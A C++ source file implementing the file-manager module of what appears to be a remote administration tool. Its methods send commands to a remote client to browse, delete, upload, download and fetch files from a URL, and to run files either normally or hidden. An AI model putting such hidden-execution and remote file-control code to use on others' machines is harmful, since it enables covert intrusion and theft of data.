#include "stdafx.h"
#include "FileManagerSrv.h"
#include "utils.h"
#include "dbg.h"

CFileManagerSrv::CFileManagerSrv(CClient*pClient) :
CEventHandler(pClient, FILE_MANAGER)
{
}


CFileManagerSrv::~CFileManagerSrv()
{
}

void CFileManagerSrv::OnClose()
{
	Notify(WM_FMDLG_ERROR, (WPARAM)TEXT("Connection close..."));
	dbg_log("CFileManagerSrv::OnClose()\n");
}
void CFileManagerSrv::OnOpen()
{
	dbg_log("CFileManagerSrv::OnOpen()\n");
}


void CFileManagerSrv::OnEvent(UINT32 e, BYTE *lpData, UINT32 Size)
{
	switch (e)
	{
	case FILE_MGR_CHDIR_RET:
		OnChangeDirRet(Size, (char*)lpData);
		break;
	case FILE_MGR_GETLIST_RET:
		OnGetListRet(Size, (char*)lpData);
		break;
		//prev 
	case FILE_MGR_NEW_FOLDER_SUCCESS:
		Notify(WM_FMDLG_NEWFOLDER_SUCCESS, (WPARAM)lpData);
		break;
	case FILE_MGR_ERROR:
		Notify(WM_FMDLG_ERROR, (WPARAM)lpData);
		break;
	default:
		break;
	}
}


void CFileManagerSrv::OnChangeDirRet(DWORD dwRead, char*buffer)
{
	//成功
	if (buffer[0])
		Send(FILE_MGR_GETLIST, 0, 0);
	
	//修改目录结果.
	Notify(WM_FMDLG_CHDIR, buffer[0], (LPARAM)&buffer[1]);
}

void CFileManagerSrv::OnGetListRet(DWORD dwRead, char*buffer)
{
	Notify(WM_FMDLG_LIST, dwRead, (LPARAM)buffer);
}

void CFileManagerSrv::Search()
{
	Send(FILE_MGR_SEARCH, 0, 0);
}

void CFileManagerSrv::Up()
{
	Send(FILE_MGR_UP, 0, 0);
}

void CFileManagerSrv::Refresh()
{
	Send(FILE_MGR_REFRESH, 0, 0);
}

void CFileManagerSrv::NewFolder()
{
	Send(FILE_MGR_NEWFOLDER, 0 , 0);
}

void CFileManagerSrv::Rename(const TCHAR *szNames)
{
	Send(FILE_MGR_RENAME, szNames, sizeof(TCHAR)*(lstrlen(szNames) + 1));
}

void CFileManagerSrv::ChDir(const TCHAR *szNewDir)
{
	Send(FILE_MGR_CHDIR, szNewDir, sizeof(TCHAR)*(lstrlen(szNewDir) + 1));
}

void CFileManagerSrv::Delete(const TCHAR *szFileList)
{
	Send(FILE_MGR_DELETE, szFileList, sizeof(TCHAR)*(lstrlen(szFileList) + 1));
}

void CFileManagerSrv::Copy(const TCHAR *szFileList)
{
	Send(FILE_MGR_COPY, szFileList, sizeof(TCHAR)*(lstrlen(szFileList) + 1));
}
void CFileManagerSrv::Cut(const TCHAR *szFileList)
{
	Send(FILE_MGR_CUT, szFileList, sizeof(TCHAR)*(lstrlen(szFileList) + 1));
}
void CFileManagerSrv::Paste()
{
	Send(FILE_MGR_PASTE, 0, 0);
}


void CFileManagerSrv::UploadFromUrl(const TCHAR *szUrl)
{
	Send(FILE_MGR_UPLOADFRURL, szUrl, sizeof(TCHAR) * (lstrlen(szUrl) + 1));
}

void CFileManagerSrv::UploadFromDisk(const TCHAR * SrcDir, const TCHAR *szFileList)
{
	vec bufs[2];
	bufs[0].lpData = SrcDir;
	bufs[0].Size = sizeof(TCHAR) * (lstrlen(SrcDir) + 1);

	bufs[1].lpData = szFileList;
	bufs[01].Size = sizeof(TCHAR) * (lstrlen(szFileList) + 1);

	Send(FILE_MGR_UPLOADFROMDISK, bufs, 2);
}

void CFileManagerSrv::Download(const TCHAR * DestDir, const TCHAR *szFileList)
{
	vec bufs[2];
	bufs[0].lpData = DestDir;
	bufs[0].Size = sizeof(TCHAR) * (lstrlen(DestDir) + 1);

	bufs[1].lpData = szFileList;
	bufs[01].Size = sizeof(TCHAR) * (lstrlen(szFileList) + 1);

	Send(FILE_MGR_DOWNLOAD, bufs,2);
}

void CFileManagerSrv::RunFileNormal(const TCHAR *szFileList)
{
	Send(FILE_MGR_RUNFILE_NORMAL, szFileList, sizeof(TCHAR)*(lstrlen(szFileList) + 1));
}
void CFileManagerSrv::RunFileHide(const TCHAR *szFileList)
{
	Send(FILE_MGR_RUNFILE_HIDE, szFileList, sizeof(TCHAR)*(lstrlen(szFileList) + 1));
}

